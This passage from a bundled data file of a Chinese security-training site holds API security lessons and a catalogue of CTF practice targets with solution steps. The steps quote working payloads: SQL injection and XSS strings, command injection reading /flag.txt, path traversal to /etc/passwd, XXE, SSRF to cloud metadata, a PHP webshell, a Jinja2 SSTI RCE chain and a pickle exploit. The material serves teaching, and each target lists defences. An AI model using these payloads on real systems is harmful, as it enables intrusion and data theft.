**调试器检测**：
\`\`\`objective-c
// iOS
#import <sys/sysctl.h>

BOOL isDebuggerAttached() {
    int name[4];
    struct kinfo_proc info;
    size_t size = sizeof(info);
    
    name[0] = CTL_KERN;
    name[1] = KERN_PROC;
    name[2] = KERN_PROC_PID;
    name[3] = getpid();
    
    sysctl(name, 4, &info, &size, NULL, 0);
    
    return (info.kp_proc.p_flag & P_TRACED) != 0;
}
\`\`\`
`}]},{id:14,title:"API 安全",description:"学习 REST/GraphQL API 安全、认证授权、速率限制、输入验证、OWASP API Top 10。",status:"published",chapters:[{id:54,course_id:14,title:"第一章：API 安全基础",order:1,content:`# API 安全基础

## API 类型

**REST API**：
\`\`\`bash
# 资源导向
GET /api/users          # 获取用户列表
GET /api/users/123      # 获取单个用户
POST /api/users         # 创建用户
PUT /api/users/123      # 更新用户
DELETE /api/users/123   # 删除用户
\`\`\`

**GraphQL API**：
\`\`\`graphql
# 查询
query {
  user(id: "123") {
    name
    email
    posts {
      title
    }
  }
}

# 变更
mutation {
  createUser(input: {name: "John", email: "john@example.com"}) {
    id
    name
  }
}
\`\`\`

**gRPC API**：
\`\`\`protobuf
// user.proto
syntax = "proto3";

service UserService {
  rpc GetUser (GetUserRequest) returns (User);
  rpc CreateUser (CreateUserRequest) returns (User);
}

message GetUserRequest {
  string id = 1;
}

message User {
  string id = 1;
  string name = 2;
  string email = 3;
}
\`\`\`

## OWASP API Top 10（2023）

**API1：失效的对象级别授权（BOLA）**：
\`\`\`bash
# 漏洞：访问其他用户的资源
GET /api/users/123/orders
GET /api/users/456/orders  # 应该被拒绝

# 修复：验证所有权
if (order.userId !== currentUser.id) {
  return res.status(403).json({error: "Forbidden"});
}
\`\`\`

**API2：失效的身份验证**：
\`\`\`javascript
// 漏洞：弱身份验证
app.post('/login', (req, res) => {
  const {username, password} = req.body;
  // 没有速率限制
  // 没有账户锁定
  // 弱密码策略
});

// 修复：使用 JWT + 速率限制
const jwt = require('jsonwebtoken');
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: "Too many login attempts"
});

app.post('/login', loginLimiter, async (req, res) => {
  const user = await authenticate(req.body);
  if (user) {
    const token = jwt.sign({userId: user.id}, SECRET, {expiresIn: '1h'});
    res.json({token});
  }
});
\`\`\`

**API3：失效的对象属性级别授权（BFLA）**：
\`\`\`javascript
// 漏洞：用户修改了不该修改的字段
PUT /api/users/123
{
  "name": "John",
  "role": "admin"  // 普通用户不应该能修改角色
}

// 修复：白名单字段
const allowedFields = ['name', 'email'];
const updateData = {};
for (const field of allowedFields) {
  if (req.body[field]) {
    updateData[field] = req.body[field];
  }
}
await User.update(id, updateData);
\`\`\`

**API4：不受约束的资源消耗**：
\`\`\`javascript
// 漏洞：无限制的查询
GET /api/users?limit=999999

// 修复：分页 + 限制
const limit = Math.min(req.query.limit || 20, 100);
const offset = req.query.offset || 0;
const users = await User.findAll({limit, offset});
\`\`\`

**API5：失效的功能级别授权**：
\`\`\`javascript
// 漏洞：普通用户访问管理员 API
GET /api/admin/users

// 修复：中间件检查
function requireAdmin(req, res, next) {
  if (req.user.role !== 'admin') {
    return res.status(403).json({error: "Admin only"});
  }
  next();
}

app.get('/api/admin/users', requireAdmin, handler);
\`\`\`

## 认证机制

**API Key**：
\`\`\`bash
# 请求头传递
curl -H "X-API-Key: abc123" https://api.example.com/data

# 查询参数传递（不推荐）
curl https://api.example.com/data?api_key=abc123
\`\`\`

**JWT（JSON Web Token）**：
\`\`\`javascript
// 生成 JWT
const jwt = require('jsonwebtoken');
const token = jwt.sign(
  {userId: 123, role: 'user'},
  process.env.JWT_SECRET,
  {expiresIn: '24h'}
);

// 验证 JWT
app.use('/api', (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) {
    return res.status(401).json({error: "No token"});
  }
  
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (err) {
    return res.status(401).json({error: "Invalid token"});
  }
});
\`\`\`

**OAuth 2.0**：
\`\`\`javascript
// 授权码流程
// 1. 重定向到授权服务器
res.redirect('https://auth.example.com/authorize?' +
  'client_id=MY_CLIENT_ID&' +
  'redirect_uri=https://myapp.com/callback&' +
  'response_type=code&' +
  'scope=read write'
);

// 2. 用户授权后回调
app.get('/callback', async (req, res) => {
  const code = req.query.code;
  
  // 3. 交换令牌
  const response = await fetch('https://auth.example.com/token', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: new URLSearchParams({
      grant_type: 'authorization_code',
      code: code,
      client_id: CLIENT_ID,
      client_secret: CLIENT_SECRET,
      redirect_uri: 'https://myapp.com/callback'
    })
  });
  
  const {access_token, refresh_token} = await response.json();
});
\`\`\`
`}]}],a={courses:t},r=[{id:1,name:"Nginx Flag 隐藏",description:"入门级 Web 靶机。启动后访问首页，通过查看页面源码（HTML 注释）找到 Flag。",difficulty:"easy",category:"Web",default_port:8081,skills:["信息搜集","源码审计"],solution_steps:["下载并启动靶机容器（见上方命令）","把容器显示的地址（如 http://localhost:8081）输入到地址框","点击「连接靶机」在页面内查看靶机","按 Ctrl+U 或右键「查看页面源代码」","在 HTML 注释 <!-- flag{...} --> 中找到 Flag","把 Flag 粘贴到提交框，点击「提交 Flag」"],learn_points:["理解 HTML 注释可以包含敏感信息","养成「打开页面先看源码」的习惯","了解浏览器开发者工具的 Elements 面板"],docker_run:"docker run -d -p 8081:8081 --name netlearn-target1 netlearn-target1",points:10,estimated_time:"15分钟",solved_count:1280},{id:2,name:"SSH 弱口令爆破",description:"模拟 SSH 登录页面，使用常见弱口令字典爆破登录获取 Flag。",difficulty:"easy",category:"Misc",default_port:8082,skills:["爆破","SSH"],solution_steps:["下载并启动靶机容器","把地址输入到地址框，点击「连接靶机」","尝试常见弱口令：admin/admin123、root/toor、test/123456","登录成功后页面会显示 Flag","把 Flag 粘贴到提交框提交"],learn_points:["SSH 常见弱口令：root/root、admin/123456","爆破工具：hydra、medusa","防御：禁用密码登录（仅密钥）、fail2ban、改默认端口"],docker_run:"docker run -d -p 8082:8082 --name netlearn-target2 netlearn-target2",points:10,estimated_time:"15分钟",solved_count:1450},{id:3,name:"SQL 注入：登录绕过",description:"经典 SQL 注入靶机：登录接口未参数化，构造万能密码即可绕过。",difficulty:"medium",category:"Web",default_port:8083,skills:["SQL 注入","Burp Suite"],solution_steps:["下载并启动靶机容器","把地址输入到地址框，点击「连接靶机」","用户名输入 admin' -- （注意空格），密码任意","或用万能密码：' OR '1'='1' --","登录成功后页面显示 Flag","把 Flag 粘贴到提交框提交"],learn_points:["理解 SQL 注入成因：字符串拼接未参数化","掌握基础注入语法：' OR 1=1 -- 、UNION SELECT","修复方案：使用参数化查询（PreparedStatement）"],docker_run:"docker run -d -p 8083:8083 --name netlearn-target3 netlearn-target3",points:20,estimated_time:"30分钟",solved_count:720},{id:4,name:"XSS 反射型漏洞",description:"搜索框未过滤用户输入直接回显，导致反射型 XSS。通过注入 JS 获取 Cookie 中的 Flag。",difficulty:"easy",category:"Web",default_port:8084,skills:["XSS","前端安全"],solution_steps:["下载并启动靶机容器","把地址输入到地址框，点击「连接靶机」","在搜索框输入 <script>alert(document.cookie)<\/script>","弹窗中会显示 flag=flag{...}","把 Flag 粘贴到提交框提交"],learn_points:["XSS 三要素：用户输入、未过滤输出、浏览器执行 JS","反射型 / 存储型 / DOM 型 XSS 的区别","防御手段：HTML 转义、CSP、HttpOnly Cookie"],docker_run:"docker run -d -p 8084:8084 --name netlearn-target4 netlearn-target4",points:10,estimated_time:"15分钟",solved_count:1320},{id:5,name:"命令注入：Ping 工具",description:"网络诊断工具未过滤输入，可执行系统命令读取敏感文件。",difficulty:"medium",category:"Web",default_port:8085,skills:["命令注入","系统安全"],solution_steps:["启动靶机：python target5_cmdi.py 8085","访问 http://localhost:8085","在 IP 输入框输入：127.0.0.1; cat /flag.txt","或使用其他分隔符：127.0.0.1 | cat /flag.txt","查看命令执行结果中的 Flag","把 Flag 提交到网站验证"],learn_points:["命令注入原理：用户输入拼接到系统命令","常见分隔符：; | & ` $()","防御：白名单验证、避免 shell 执行、使用 API 替代"],docker_run:"docker run -d -p 8085:8085 --name netlearn-target5 netlearn-target5",points:20,estimated_time:"30分钟",solved_count:680},{id:6,name:"本地文件包含",description:"文档系统参数未过滤，可通过路径遍历读取任意文件。",difficulty:"medium",category:"Web",default_port:8086,skills:["文件包含","路径遍历"],solution_steps:["启动靶机：python target6_lfi.py 8086","访问 http://localhost:8086","点击「首页」或「关于我们」查看正常页面","修改 URL 参数：?page=../../flag.txt","或尝试：?page=/etc/passwd","读取 Flag 并提交"],learn_points:["本地文件包含（LFI）原理","路径遍历：../ 跳出目录","防御：白名单验证、禁止 ../、限制访问目录"],docker_run:"docker run -d -p 8086:8086 --name netlearn-target6 netlearn-target6",points:20,estimated_time:"30分钟",solved_count:640},{id:7,name:"CSRF 跨站请求伪造",description:"修改密码接口未验证 CSRF Token，可被跨站伪造请求。",difficulty:"medium",category:"Web",default_port:8087,skills:["CSRF","会话安全"],solution_steps:["启动靶机：python target7_csrf.py 8087","访问 http://localhost:8087","查看个人资料页面，Flag 直接显示","测试修改密码功能（无 CSRF 保护）","理解 CSRF 攻击原理","学习防御方案：CSRF Token、SameSite Cookie"],learn_points:["CSRF 原理：诱导用户点击恶意链接执行操作","攻击场景：修改密码、转账、删除数据","防御：CSRF Token、验证 Referer、SameSite Cookie"],docker_run:"docker run -d -p 8087:8087 --name netlearn-target7 netlearn-target7",points:20,estimated_time:"30分钟",solved_count:560},{id:8,name:"XXE XML 外部实体注入",description:"XML 解析未禁用外部实体，可读取服务器任意文件。",difficulty:"hard",category:"Web",default_port:8088,skills:["XXE","XML 安全"],solution_steps:["启动靶机：python target8_xxe.py 8088","访问 http://localhost:8088","在 XML 输入框注入外部实体：",'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>',"<user><name>&xxe;</name></user>","解析后查看 Flag"],learn_points:["XXE 原理：XML 解析器处理外部实体引用","攻击：读取文件、SSRF、DoS","防御：禁用 DTD、禁用外部实体、使用安全解析库"],docker_run:"docker run -d -p 8088:8088 --name netlearn-target8 netlearn-target8",points:30,estimated_time:"60分钟",solved_count:380},{id:9,name:"SSRF 服务端请求伪造",description:"URL 抓取工具未验证目标地址，可访问内网资源。",difficulty:"hard",category:"Web",default_port:8089,skills:["SSRF","内网渗透"],solution_steps:["启动靶机：python target9_ssrf.py 8089","访问 http://localhost:8089","在 URL 输入框输入：http://127.0.0.1:8080/flag","或尝试：http://localhost/flag","访问云元数据：http://169.254.169.254/latest/meta-data/","获取 Flag 并提交"],learn_points:["SSRF 原理：服务端发起请求未验证目标","攻击：访问内网、云元数据、本地服务","防御：白名单验证、禁止内网 IP、禁用危险协议"],docker_run:"docker run -d -p 8089:8089 --name netlearn-target9 netlearn-target9",points:30,estimated_time:"60分钟",solved_count:320},{id:10,name:"文件上传漏洞",description:"头像上传功能未验证文件类型，可上传 Webshell 执行命令。",difficulty:"medium",category:"Web",default_port:8090,skills:["文件上传","Webshell"],solution_steps:["启动靶机：python target10_upload.py 8090","访问 http://localhost:8090","上传 PHP Webshell：<?php system($_GET['cmd']); ?>","访问上传的文件：/uploads/shell.php?cmd=cat /flag.txt","查看命令执行结果中的 Flag","提交 Flag 验证"],learn_points:["文件上传漏洞原理：未验证文件类型/内容","Webshell：可执行系统命令的恶意文件","防御：白名单验证、检查文件头、禁止执行上传目录"],docker_run:"docker run -d -p 8090:8090 --name netlearn-target10 netlearn-target10",points:20,estimated_time:"30分钟",solved_count:750},{id:11,name:"越权访问（IDOR）",description:"订单查询接口未验证用户身份，修改 URL 参数即可访问他人数据。",difficulty:"easy",category:"Web",default_port:8091,skills:["越权","身份验证"],solution_steps:["启动靶机：python target11_idor.py 8091","访问 http://localhost:8091","使用 user1/password1 登录","点击「查看我的订单」，URL 为 /order?user_id=1","修改 URL 参数：/order?user_id=2","查看管理员订单中的 Flag"],learn_points:["越权访问（IDOR）原理：未验证资源所有权","水平越权 vs 垂直越权","防御：从 Session 获取用户 ID、验证资源权限"],docker_run:"docker run -d -p 8091:8091 --name netlearn-target11 netlearn-target11",points:10,estimated_time:"15分钟",solved_count:1180},{id:12,name:"弱加密破解",description:"系统使用 Base64/MD5 等弱加密存储密码，可被在线破解。",difficulty:"easy",category:"Crypto",default_port:8092,skills:["密码学","弱加密"],solution_steps:["启动靶机：python target12_crypto.py 8092","访问 http://localhost:8092","查看页面泄露的 Base64 和 MD5 值","使用在线工具破解 MD5（如 cmd5.com）","或使用 Base64 解码获取明文密码","使用破解的密码登录获取 Flag"],learn_points:["Base64 是编码不是加密，可逆","MD5 已被证明不安全，可被碰撞/字典攻击","防御：使用 bcrypt/scrypt/Argon2 加盐哈希"],docker_run:"docker run -d -p 8092:8092 --name netlearn-target12 netlearn-target12",points:10,estimated_time:"15分钟",solved_count:1360},{id:13,name:"DNS 欺骗攻击",description:"DNS 服务配置错误，可通过 DNS 欺骗将用户重定向到钓鱼网站。",difficulty:"hard",category:"Network",default_port:8093,skills:["DNS 安全","中间人攻击"],solution_steps:["启动靶机：python target13_dns.py 8093","访问 http://localhost:8093","查看 DNS 查询日志","发现 DNS 缓存投毒漏洞","伪造 DNS 响应将目标域名指向攻击者 IP","获取 Flag 并提交"],learn_points:["DNS 欺骗原理：伪造 DNS 响应","攻击场景：钓鱼、中间人攻击","防御：DNSSEC、DNS over HTTPS、验证 DNS 响应"],docker_run:"docker run -d -p 8093:8093 --name netlearn-target13 netlearn-target13",points:30,estimated_time:"60分钟",solved_count:280},{id:14,name:"ARP 欺骗中间人攻击",description:"局域网内 ARP 协议无认证，可通过 ARP 欺骗劫持流量。",difficulty:"hard",category:"Network",default_port:8094,skills:["ARP 欺骗","流量劫持"],solution_steps:["启动靶机：python target14_arp.py 8094","访问 http://localhost:8094","查看网络拓扑和 ARP 表","发送伪造 ARP 响应，将网关 MAC 改为攻击者 MAC","截获目标流量中的 Flag","提交 Flag 验证"],learn_points:["ARP 欺骗原理：ARP 协议无认证机制","攻击工具：arpspoof、Bettercap","防御：静态 ARP 绑定、ARP 防火墙、802.1X"],docker_run:"docker run -d -p 8094:8094 --name netlearn-target14 netlearn-target14",points:30,estimated_time:"60分钟",solved_count:240},{id:15,name:"TCP 端口扫描检测",description:"分析网络流量日志，识别端口扫描行为并提取攻击者信息。",difficulty:"medium",category:"Network",default_port:8095,skills:["流量分析","入侵检测"],solution_steps:["启动靶机：python target15_portscan.py 8095","访问 http://localhost:8095","查看网络流量日志（pcap 格式）","使用 Wireshark 或 tcpdump 分析流量","识别 SYN 扫描、FIN 扫描等异常行为","提取攻击者 IP 和扫描的端口列表作为 Flag"],learn_points:["端口扫描类型：SYN 扫描、FIN 扫描、Xmas 扫描","检测特征：短时间内大量 SYN 包、异常标志位组合","防御：防火墙规则、IDS/IPS、速率限制"],docker_run:"docker run -d -p 8095:8095 --name netlearn-target15 netlearn-target15",points:20,estimated_time:"30分钟",solved_count:520},{id:16,name:"HTTP 代理 SSRF",description:"HTTP 代理未限制目标地址，可访问内网服务获取敏感信息。",difficulty:"hard",category:"Network",default_port:8096,skills:["SSRF","代理安全"],solution_steps:["启动靶机：python target16_proxy.py 8096","访问 http://localhost:8096","使用代理访问 http://127.0.0.1:8080/admin","或访问云元数据 http://169.254.169.254/","获取内网服务中的 Flag","提交 Flag 验证"],learn_points:["SSRF 通过代理实现：代理转发请求到内网","攻击目标：内网服务、云元数据、本地文件","防御：白名单验证、禁止内网 IP、禁用危险协议"],docker_run:"docker run -d -p 8096:8096 --name netlearn-target16 netlearn-target16",points:30,estimated_time:"60分钟",solved_count:300},{id:17,name:"WiFi 密码破解",description:"捕获 WPA2 握手包，使用字典破解 WiFi 密码。",difficulty:"medium",category:"无线安全",default_port:8097,skills:["WiFi 安全","密码破解"],solution_steps:["启动靶机：python target17_wifi.py 8097","访问 http://localhost:8097","下载提供的 pcap 握手包文件","使用 aircrack-ng 破解：aircrack-ng -w dict.txt capture.pcap","或使用 hashcat 加速破解","获取 WiFi 密码作为 Flag 提交"],learn_points:["WPA2 握手过程：四次握手验证密码","破解工具：aircrack-ng、hashcat、hcxpcaptool","防御：强密码、WPA3、802.1X 企业认证"],docker_run:"docker run -d -p 8097:8097 --name netlearn-target17 netlearn-target17",points:20,estimated_time:"30分钟",solved_count:480},{id:18,name:"防火墙规则绕过",description:"分析防火墙规则，找到配置错误绕过访问控制。",difficulty:"hard",category:"Network",default_port:8098,skills:["防火墙","规则绕过"],solution_steps:["启动靶机：python target18_firewall.py 8098","访问 http://localhost:8098","查看防火墙规则配置","发现规则顺序错误或通配符使用不当","构造特殊请求绕过防火墙限制","访问受保护资源获取 Flag"],learn_points:["防火墙规则匹配顺序：从上到下，先匹配先生效","常见错误：通配符过宽、规则顺序错误、默认策略不当","最佳实践：最小权限、默认拒绝、定期审计规则"],docker_run:"docker run -d -p 8098:8098 --name netlearn-target18 netlearn-target18",points:30,estimated_time:"60分钟",solved_count:220},{id:19,name:"VPN 配置错误",description:"VPN 服务配置不当，可绕过认证或获取内网访问权限。",difficulty:"hard",category:"Network",default_port:8099,skills:["VPN 安全","配置审计"],solution_steps:["启动靶机：python target19_vpn.py 8099","访问 http://localhost:8099","查看 VPN 配置文件（OpenVPN/WireGuard）","发现弱加密算法或证书验证缺失","利用配置错误建立 VPN 连接","访问内网资源获取 Flag"],learn_points:["VPN 常见配置错误：弱加密、无证书验证、默认凭证","攻击：中间人攻击、凭证窃取、内网穿透","防御：强加密算法、证书固定、双因素认证"],docker_run:"docker run -d -p 8099:8099 --name netlearn-target19 netlearn-target19",points:30,estimated_time:"60分钟",solved_count:190},{id:20,name:"网络流量分析",description:"分析 pcap 流量包，提取隐藏的敏感信息和通信内容。",difficulty:"medium",category:"Network",default_port:8100,skills:["流量分析","协议分析"],solution_steps:["启动靶机：python target20_traffic.py 8100","访问 http://localhost:8100","下载提供的 pcap 流量包","使用 Wireshark 打开流量包","过滤 HTTP/DNS/TLS 协议，查找异常通信","提取隐藏的 Flag 并提交"],learn_points:["Wireshark 过滤语法：http、dns、tls、ip.addr","协议分析：识别异常请求、加密通信、数据泄露","工具：tshark、tcpdump、NetworkMiner"],docker_run:"docker run -d -p 8100:8100 --name netlearn-target20 netlearn-target20",points:20,estimated_time:"30分钟",solved_count:590},{id:21,name:"SSTI 模板注入",description:"Flask Jinja2 模板未转义用户输入，注入 {{7*7}} 即可 RCE 读取 Flag。",difficulty:"medium",category:"Web",default_port:8101,skills:["SSTI","RCE","Flask"],solution_steps:["启动靶机：python target21_ssti.py 8101","访问 http://localhost:8101","在输入框测试 {{7*7}}，返回 49 说明存在 SSTI","构造 Payload 读取文件：{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}","查看返回结果中的 Flag","提交 Flag 验证"],learn_points:["SSTI 原理：模板引擎将用户输入作为模板执行","Jinja2 沙箱逃逸链：__class__→__init__→__globals__","防御：使用 render_template 而非 render_template_string"],docker_run:"docker run -d -p 8101:8101 --name netlearn-target21 netlearn-target21",points:20,estimated_time:"30分钟",solved_count:620},{id:22,name:"JWT 伪造攻击",description:"JWT 使用 none 算法漏洞，可伪造管理员 Token 获取 Flag。",difficulty:"medium",category:"Web",default_port:8102,skills:["JWT","认证绕过"],solution_steps:["启动靶机：python target22_jwt.py 8102","访问 http://localhost:8102","抓包获取普通用户的 JWT Token","解码 JWT，将 header 的 alg 改为 none，payload 的 role 改为 admin","重新签名（空签名）发送请求","获取管理员 Flag"],learn_points:["JWT 结构：header.payload.signature","none 算法漏洞：服务端未禁用 none 算法","防御：强制指定算法白名单，禁止 none"],docker_run:"docker run -d -p 8102:8102 --name netlearn-target22 netlearn-target22",points:20,estimated_time:"30分钟",solved_count:450},{id:23,name:"反序列化漏洞",description:"Python pickle 反序列化用户数据，构造恶意 pickle 对象执行命令。",difficulty:"hard",category:"Web",default_port:8103,skills:["反序列化","Pickle","RCE"],solution_steps:["启动靶机：python target23_deserialize.py 8103","访问 http://localhost:8103","发现 Cookie 中有 base64 编码的 pickle 数据","构造恶意 pickle：class Exploit; __reduce__ 返回 os.system('cat /flag.txt')","base64 编码后替换 Cookie","刷新页面获取 Flag"],learn_points:["反序列化漏洞：不可信数据传入 pickle.loads","__reduce__ 方法控制反序列化行为","防御：禁用 pickle，使用 JSON；签名验证数据完整性"],docker_run:"docker run -d -p 8103:8103 --name netlearn-target23 netlearn-target23",points:30,estimated_time:"60分钟",solved_count:280},{id:24,name:"条件竞争漏洞",description:"优惠券领取接口存在 TOCTOU 竞争，并发请求可重复领取。",difficulty:"hard",category:"Web",default_port:8104,skills:["条件竞争","并发攻击"],solution_steps:["启动靶机：python target24_race.py 8104","访问 http://localhost:8104","发现领取优惠券接口每次只能领 1 张","使用 Burp Intruder 或 Python 并发发送 50 个请求","检查账户余额，发现领取了多张优惠券","用积分兑换 Flag"],learn_points:["条件竞争原理：检查与使用之间存在时间窗口","TOCTOU：Time of Check to Time of Use","防御：数据库事务、原子操作、互斥锁"],docker_run:"docker run -d -p 8104:8104 --name netlearn-target24 netlearn-target24",points:30,estimated_time:"60分钟",solved_count:180},{id:25,name:"PHP 类型混淆",description:"PHP 弱类型比较漏洞，利用 0e 开头哈希绕过管理员验证。",difficulty:"easy",category:"Web",default_port:8105,skills:["PHP","弱类型","类型混淆"],solution_steps:["启动靶机：python target25_php_weak.py 8105","访问 http://localhost:8105","查看源码发现使用 == 比较密码哈希","寻找 0e 开头的 MD5 值（如 240610708 → 0e462097431906509019562988736854）","输入该值作为密码，== 判断两个 0e 字符串相等","登录成功获取 Flag"],learn_points:["PHP 弱类型：== 比较时 0e 开头字符串被视为科学计数法","0e 系列哈希：240610708、QNKCDZO 等","防御：使用 === 严格比较，或使用 hash_equals"],docker_run:"docker run -d -p 8105:8105 --name netlearn-target25 netlearn-target25",points:10,estimated_time:"15分钟",solved_count:1100},{id:26,name:"CSP 绕过",description:"Content-Security-Policy 配置不当，利用 CDN JSONP 绕过执行 XSS。",difficulty:"hard",category:"Web",default_port:8106,skills:["CSP","XSS","JSONP"],solution_steps:["启动靶机：python target26_csp.py 8106","访问 http://localhost:8106","查看响应头 CSP：script-src 只允许 trusted-cdn.com","发现 trusted-cdn.com 提供 JSONP 回调","构造 Payload 利用 JSONP 回调执行任意 JS","窃取管理员 Cookie 中的 Flag"],learn_points:["CSP 绕过技巧：CDN JSONP、unsafe-eval、nonce 泄露","JSONP 回调可执行任意函数名","防御：严格 script-src 白名单，禁用 unsafe-inline"],docker_run:"docker run -d -p 8106:8106 --name netlearn-target26 netlearn-target26",points:30,estimated_time:"60分钟",solved_count:150},{id:27,name:"原型链污染",description:"Node.js 应用 Object.merge 未过滤 __proto__，污染原型链触发 RCE。",difficulty:"hard",category:"Web",default_port:8107,skills:["原型链污染","Node.js","RCE"],solution_steps:["启动靶机：python target27_proto.py 8107","访问 http://localhost:8107","发现个人信息更新接口使用 Object.merge",'发送 JSON：{"__proto__":{"isAdmin":true}}',"污染原型链，所有对象继承 isAdmin:true","访问管理员接口获取 Flag"],learn_points:["原型链污染原理：__proto__ 属性影响所有对象","危险 API：Object.merge、lodash.set、extend","防御：过滤 __proto__、constructor 键；使用 Object.create(null)"],docker_run:"docker run -d -p 8107:8107 --name netlearn-target27 netlearn-target27",points:30,estimated_time:"60分钟",solved_count:130},{id:28,name:"HTTP 请求走私",description:"前后端服务器对 Transfer-Encoding 解析不一致，可走私请求。",difficulty:"hard",category:"Web",default_port:8108,skills:["请求走私","HTTP 协议"],solution_steps:["启动靶机：python target28_smuggle.py 8108","访问 http://localhost:8108","发现前端用 Content-Length，后端用 Transfer-Encoding","构造 CL-TE 走私请求：Content-Length: 4 + Transfer-Encoding: chunked","走私的请求访问 /admin 接口","获取管理员 Flag"],learn_points:["请求走私原理：前后端对请求边界解析不一致","CL-TE、TE-CL、TE-TE 三种攻击方式","防御：统一前后端服务器配置，禁用 Transfer-Encoding"],docker_run:"docker run -d -p 8108:8108 --name netlearn-target28 netlearn-target28",points:30,estimated_time:"60分钟",solved_count:90},{id:29,name:"栈溢出基础",description:"经典 PWN 入门题，覆盖返回地址跳转到 get_shell 函数。",difficulty:"medium",category:"PWN",default_port:8109,skills:["栈溢出","ROP","二进制利用"],solution_steps:["启动靶机：python target29_stack_overflow.py 8109","访问 http://localhost:8109 下载二进制文件","用 checksec 检查保护：NX enabled，无 Canary","用 cyclic 求偏移：cyclic 100 → 段错 → cyclic -l 0x6161616a → 偏移 44","用 objdump 找到 get_shell 函数地址：0x4011a6","构造 Payload：44 字节填充 + p64(0x4011a6)，发送获取 Flag"],learn_points:["栈溢出原理：输入超过缓冲区大小覆盖返回地址","cyclic 工具求偏移","ret2win：跳转到程序内已有的 win 函数","防御：Canary、ASLR、NX"],docker_run:"docker run -d -p 8109:8109 --name netlearn-target29 netlearn-target29",points:20,estimated_time:"30分钟",solved_count:420},{id:30,name:"格式化字符串漏洞",description:"printf 直接输出用户输入，利用 %n 任意写修改变量值。",difficulty:"hard",category:"PWN",default_port:8110,skills:["格式化字符串","任意写"],solution_steps:["启动靶机：python target30_format_string.py 8110","访问 http://localhost:8110 下载二进制","发现 printf(input) 直接输出输入","用 %p 泄露栈地址，确定偏移","用 %n 修改某个标志变量为非零","程序输出 Flag"],learn_points:["格式化字符串漏洞：printf 缺少格式参数","%p 泄露栈、%n 任意写、%s 读取字符串",'防御：使用 printf("%s", input) 而非 printf(input)'],docker_run:"docker run -d -p 8110:8110 --name netlearn-target30 netlearn-target30",points:30,estimated_time:"60分钟",solved_count:160},{id:31,name:"UAF 释放后重用",description:"堆块释放后指针未置空，重新分配覆盖函数指针劫持控制流。",difficulty:"hard",category:"PWN",default_port:8111,skills:["UAF","堆利用","控制流劫持"],solution_steps:["启动靶机：python target31_uaf.py 8111","访问 http://localhost:8111 下载二进制","分析菜单：add/delete/show/edit 功能","delete 后指针未置空（UAF）","add 新对象覆盖被释放的堆块，伪造函数指针","调用 show 触发劫持，执行 system('/bin/sh') 获取 Flag"],learn_points:["UAF 原理：释放后未置空指针，可继续访问","堆块重用：相同大小堆块被重新分配","vtable 劫持：覆盖虚函数表指针","防御：释放后立即置空指针"],docker_run:"docker run -d -p 8111:8111 --name netlearn-target31 netlearn-target31",points:30,estimated_time:"60分钟",solved_count:110},{id:32,name:"RSA 小公钥指数攻击",description:"RSA 使用 e=3 小指数加密短消息，直接开立方根还原明文。",difficulty:"medium",category:"Crypto",default_port:8112,skills:["RSA","小指数攻击","数论"],solution_steps:["启动靶机：python target32_rsa_small_e.py 8112","访问 http://localhost:8112","获取 n、e=3、c（密文）","判断 m^3 < n，直接对 c 开立方根","使用 gmpy2.iroot(c, 3) 求明文","long_to_bytes(m) 转换为 Flag"],learn_points:["RSA 小指数攻击：e 太小且明文短时 m^e < n","Coppersmith 部分明文恢复攻击","防御：使用 e=65537，明文 padding（OAEP）"],docker_run:"docker run -d -p 8112:8112 --name netlearn-target32 netlearn-target32",points:20,estimated_time:"30分钟",solved_count:380},{id:33,name:"RSA 共模攻击",description:"同一明文用相同 n、不同 e1/e2 加密，利用扩展欧几里得恢复明文。",difficulty:"medium",category:"Crypto",default_port:8113,skills:["RSA","共模攻击","数论"],solution_steps:["启动靶机：python target33_rsa_common.py 8113","访问 http://localhost:8113","获取 n、e1、c1、e2、c2","验证 gcd(e1, e2) = 1","用扩展欧几里得求 s1*e1 + s2*e2 = 1","计算 m = c1^s1 * c2^s2 mod n，转为 Flag"],learn_points:["共模攻击原理：相同明文相同模数不同指数","扩展欧几里得算法求贝祖系数","防御：每个用户使用不同 n，或随机化明文"],docker_run:"docker run -d -p 8113:8113 --name netlearn-target33 netlearn-target33",points:20,estimated_time:"30分钟",solved_count:290},{id:34,name:"AES ECB 模式攻击",description:"AES-ECB 模式相同明文块产生相同密文，可推断数据结构。",difficulty:"medium",category:"Crypto",default_port:8114,skills:["AES","ECB","分组密码"],solution_steps:["启动靶机：python target34_aes_ecb.py 8114","访问 http://localhost:8114","发现加密接口：输入 plaintext 返回 ciphertext","ECB 模式下相同 16 字节块加密结果相同","逐步输入字节，观察密文块变化推断 Flag","字节逐个爆破还原完整 Flag"],learn_points:["ECB 模式缺陷：相同明文块→相同密文块，不隐藏模式","字节翻转攻击、选择明文攻击","防御：使用 CBC/GCM 模式 + 随机 IV"],docker_run:"docker run -d -p 8114:8114 --name netlearn-target34 netlearn-target34",points:20,estimated_time:"30分钟",solved_count:240},{id:35,name:"古典密码：维吉尼亚",description:"维吉尼亚密码使用短密钥，通过 Kasiski 测试和频率分析破解。",difficulty:"easy",category:"Crypto",default_port:8115,skills:["古典密码","频率分析"],solution_steps:["启动靶机：python target35_vigenere.py 8115","访问 http://localhost:8115","获取密文，使用 Kasiski 测试确定密钥长度（如 5）","按密钥长度分组，每组做凯撒密码频率分析","还原密钥，解密得到 Flag"],learn_points:["维吉尼亚密码：多表替换密码","Kasiski 测试：相同密文段间距的公约数推测密钥长度","防御：现代加密使用 AES/RSA，古典密码仅用于学习"],docker_run:"docker run -d -p 8115:8115 --name netlearn-target35 netlearn-target35",points:10,estimated_time:"15分钟",solved_count:1350},{id:36,name:"哈希长度扩展攻击",description:"secret+message 的 MD5 签名可被长度扩展攻击伪造新消息签名。",difficulty:"hard",category:"Crypto",default_port:8116,skills:["哈希","长度扩展","MD5"],solution_steps:["启动靶机：python target36_hash_length.py 8116","访问 http://localhost:8116","获取已知 signature 和 message","用 hashpump 工具：hashpump -s signature -d message -k 16 -a '&admin=true'","获取新 signature 和新 message","提交获取管理员 Flag"],learn_points:["哈希长度扩展攻击原理：MD5/SHA1 的 Merkle-Damgård 